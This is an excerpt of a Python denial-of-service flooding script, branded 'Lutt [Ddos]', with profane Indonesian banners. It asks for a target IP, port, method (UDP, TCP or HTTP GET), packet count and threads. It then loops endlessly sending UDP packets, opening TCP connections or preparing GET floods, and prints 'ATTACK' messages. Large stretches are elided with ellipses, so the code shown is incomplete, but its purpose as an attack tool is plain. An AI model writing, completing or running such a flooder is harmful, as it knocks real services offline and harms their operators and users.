...
print("\033[95m")
print("""
       JANGAN ABUSE YAH KONTOL
       BACA TEKS DI BAWAH!!!""")
print("""\033[91m
   ||JANGAN ABUSE YAH BACA TEKS DI BAWA||
#==========================================#
|              PERINGATAN!!!!              |
| JANGAN ABUSE YAH KONTOL NANTIK LO DI     |
| BULI JADI JANGAN ABUSE YAH GUNAKAN       |
| TOOLS INI DENGAN BAIK SALAM DARI ||LUTT|||
#===========================================#""")
print("\033[92m")
print("""
...
print("""                                                               
    •MODE NYA PILIH SALAH SATU|•
      | UDP | TCP | GET |""")
print("\033[92m")         
ip = str(input("[ ====> ] ====> IP WIBU: "))
port = int(input("[ ====> ] ====> PORT WIBU : "))
choice = str(input("[ ====> ] ====> Method |DI ATAS|: "))
times = int(input("[ ====> ] ====> HADIA PAKET Wibu : "))
threads = int(input("[ ====> ] ====> BONUS PAKET Wibu : "))
	...
	while True:
		try:
			...
			for x in range(times):
				s.sendto(data,addr)
			print(+"\033[0;37;50m LUTT COLI ip %s \033[95mport %s"%(ip,port))
		except:
			print("\033[0;37;95m LUTT SEREPET IP %s \033[92m LUTT SEREPET PORT %s"%(ip,port))
...
def tcp():
	...
	while True:
		try:
			...
			s.close()
			print("\033[1;31;95m LUTT ATTACK!! %s port %s"%(ip,port))
...
os.system('color ' +random.choice(['D'])+ " & cls & title Lutt [Ddos]")
def get():
    header = Headers("get")
    i = random.choice(("[*]","[!]","[#]"))
